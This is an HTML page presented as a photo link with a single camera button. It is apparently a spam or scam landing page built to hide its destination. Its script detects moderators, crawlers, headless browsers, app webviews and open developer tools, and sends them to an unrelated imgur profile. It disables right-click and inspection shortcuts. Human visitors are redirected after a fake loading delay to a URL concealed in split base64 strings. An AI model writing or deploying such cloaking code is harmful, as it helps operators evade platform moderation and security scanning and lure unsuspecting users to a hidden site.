<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>üì∑</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    .btn {
      background-color: white;
      color: black;
      border: none;
      border-radius: 999px;
      padding: 0.5rem 9rem;
      font-size: 2rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }

    #loading {
      display: none;
      flex-direction: column;
      align-items: center;
      color: white;
      font-size: 2rem;
    }

    .loader {
      margin-top: 1rem;
      width: 50px;
      height: 50px;
      border: 6px solid #fff;
      border-top: 6px solid #555;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    canvas.b {
      display: none;
    }
  </style>
</head>

<body>
  <button class="btn" onclick="g()">üì∑</button>
  <div id="loading">
    ‚è≥ Loading...
    <div class="loader"></div>
  </div>
  <canvas class="b" id="bait"></canvas>

  <script>
    (() => {
      const ua = navigator.userAgent.toLowerCase();
      const badUA = [
        "instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line",
        "pinterest", "telegram", "grindr", "discord", "reddit", "snapchat",
        "puppeteer", "selenium", "phantomjs", "headless", "googlebot", "moderator",
        "python-requests", "curl", "wget", "java", "aiohttp", "go-http-client", "httpclient"
      ];

      const isBad = () =>
        badUA.some(s => ua.includes(s)) ||
        window.top !== window.self ||
        navigator.webdriver ||
        navigator.plugins.length === 0 ||
        !navigator.languages ||
        /HeadlessChrome/.test(navigator.userAgent);

      const isCanvasSpoofed = () => {
        try {
          const canvas = document.createElement("canvas");
          const ctx = canvas.getContext("2d");
          canvas.width = 100; canvas.height = 100;
          ctx.textBaseline = "top";
          ctx.font = "14px Arial";
          ctx.fillText("bot-check", 2, 2);
          return canvas.toDataURL().length < 1000;
        } catch {
          return true;
        }
      };

      let interacted = false;
      document.addEventListener("mousemove", () => interacted = true);
      document.addEventListener("touchstart", () => interacted = true);
      document.addEventListener("keypress", () => interacted = true);

      if (isBad() || isCanvasSpoofed()) {
        location.href = "https://imgur.com/user/carlovershub"; 
      }

      setTimeout(() => {
        if (!interacted) location.href = "https://imgur.com/user/carlovershub";
      }, 3000);
    })();

    (() => {
      const c = document.getElementById("bait").getContext("2d");
      c.canvas.width = 300;
      c.canvas.height = 80;
      c.font = "20px Arial";
      c.fillStyle = "#000";
      const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
      const p2 = "ZWhiaXhlZQ==";
      const x = atob(p1 + p2);
      c.fillText(x, 10, 50);
    })();

    setInterval(() => {
      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
        location.href = "https://imgur.com/user/carlovershub";
      }
    }, 500);

    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = e => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
    };

    let i = false;
    document.addEventListener("mousemove", () => i = true);
    document.addEventListener("touchstart", () => i = true);
    document.addEventListener("keypress", () => i = true);

    function g() {
      if (!i) return;
      document.querySelector(".btn").style.display = "none";
      document.getElementById("loading").style.display = "flex";

      setTimeout(() => {
        const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
        const p2 = "ZWhiaXhlZQ==";
        const url = atob(p1 + p2);
        if (url.startsWith("http")) window.location.replace(url);
      }, 2000 + Math.random() * 1000);
    }
  </script>
</body>
</html>
